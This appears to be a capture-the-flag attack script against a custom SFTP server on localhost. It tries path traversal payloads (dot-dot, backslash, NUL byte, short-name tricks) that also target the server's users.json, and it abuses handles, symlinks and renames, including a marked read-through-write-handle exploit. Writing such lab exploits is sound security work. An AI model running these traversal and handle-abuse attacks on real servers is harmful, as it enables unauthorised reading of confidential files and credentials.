import argparse
import asyncio
import getpass
import secrets
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "client"))

import client  # noqa: E402
from client import SFTPError, sstr  # noqa: E402

FLAG = "/projects/confidential/flag.txt"
HINT = "/public/ctf_hint.txt"

SSH_FXP_RENAME = 18
SSH_FXP_SYMLINK = 20

PATH_TRICKS = [
    ("direct read", FLAG),
    ("dot-dot inside the jail", "/public/../projects/confidential/flag.txt"),
    ("escape to server data", "/../../server/data/users.json"),
    ("backslash traversal", "..\\..\\server\\data\\users.json"),
    ("case variant", "/PROJECTS/Confidential/FLAG.TXT"),
    ("8.3 short name", "/PROJEC~1/CONFID~1/flag.txt"),
    ("NUL byte", HINT + "\0/../../projects/confidential/flag.txt"),
]


async def try_read(sftp, path):
    handle = await sftp.open(path, client.SSH_FXF_READ)
    try:
        return (await sftp.read(handle, 0, 4096)).decode("utf-8", "replace").strip()
    finally:
        await sftp.close(handle)


async def open_for_write(sftp, path):
    # no TRUNC, so a successful open does not damage the file
    handle = await sftp.open(path, client.SSH_FXF_WRITE)
    await sftp.close(handle)
    return "opened for writing"


async def read_through_write(sftp, path):
    # the exploit: open read+write (write is allowed), then read through the handle
    handle = await sftp.open(path, client.SSH_FXF_READ | client.SSH_FXF_WRITE)
    try:
        return (await sftp.read(handle, 0, 4096)).decode("utf-8", "replace").strip()
    finally:
        await sftp.close(handle)


async def attempts(sftp, second):
    """Yields (name, coroutine)."""
    for name, path in PATH_TRICKS:
        yield f"read: {name}", try_read(sftp, path)
    yield "stat the flag", sftp.stat(FLAG)
    yield "list the folder", sftp.listdir("/projects/confidential")
    yield "open the flag for writing", open_for_write(sftp, FLAG)
    yield "read+write open, then read (exploit)", read_through_write(sftp, FLAG)
    yield "mkdir inside the folder", sftp.mkdir("/projects/confidential/x")
    yield "symlink to the flag", sftp.request(SSH_FXP_SYMLINK, sstr("/public/link") + sstr(FLAG))
    yield "rename the flag out", sftp.request(SSH_FXP_RENAME, sstr(FLAG) + sstr("/public/flag.txt"))
    yield "forged handle", sftp.read(secrets.token_hex(8).encode(), 0, 4096)

    async def closed_handle():
        handle = await sftp.open(HINT, client.SSH_FXF_READ)
        await sftp.close(handle)
        return await sftp.read(handle, 0, 4096)
    yield "reuse a closed handle", closed_handle()

    async def other_session_handle():
        handle = await sftp.open(HINT, client.SSH_FXF_READ)
        try:
            return await second.read(handle, 0, 4096)
        finally:
            await sftp.close(handle)
    yield "handle from another session", other_session_handle()

    async def read_handle_to_write():
        handle = await sftp.open(HINT, client.SSH_FXF_READ)
        try:
            return await sftp.write(handle, 0, b"pwned")
        finally:
            await sftp.close(handle)
    yield "write through a read handle", read_handle_to_write()


def describe(result):
    if isinstance(result, bytes):
        result = result.decode("utf-8", "replace")
    text = str(result)
    return text if len(text) < 60 else text[:57] + "..."


async def run(args, password):
    conn, sftp = await client.connect(args.host, args.port, args.username, password,
                                      known_hosts=args.known_hosts)
    conn2, second = await client.connect(args.host, args.port, args.username, password,
                                         known_hosts=args.known_hosts)
    captured = False
    try:
        print(f"attacking as {args.username}\n")
        async for name, coro in attempts(sftp, second):
            try:
                result = await coro
            except SFTPError as e:
                print(f"  blocked  {name:<32} {e}")
                continue
            if isinstance(result, str) and result.startswith("FLAG{"):
                captured = True
                print(f"  FLAG     {name:<32} {result}")
            else:
                print(f"  ok       {name:<32} {describe(result)}")
    finally:
        conn.close()
        conn2.close()
    print("\nflag captured" if captured else "\nflag not captured")
    return captured


def main():
    parser = argparse.ArgumentParser(description="CTF attack attempts")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=2222)
    parser.add_argument("--username", required=True)
    parser.add_argument("--known-hosts")
    args = parser.parse_args()
    password = getpass.getpass(f"{args.username}@{args.host}'s password: ")
    try:
        asyncio.run(run(args, password))
    except Exception as e:
        sys.exit(f"error: {e}")


if __name__ == "__main__":
    main()
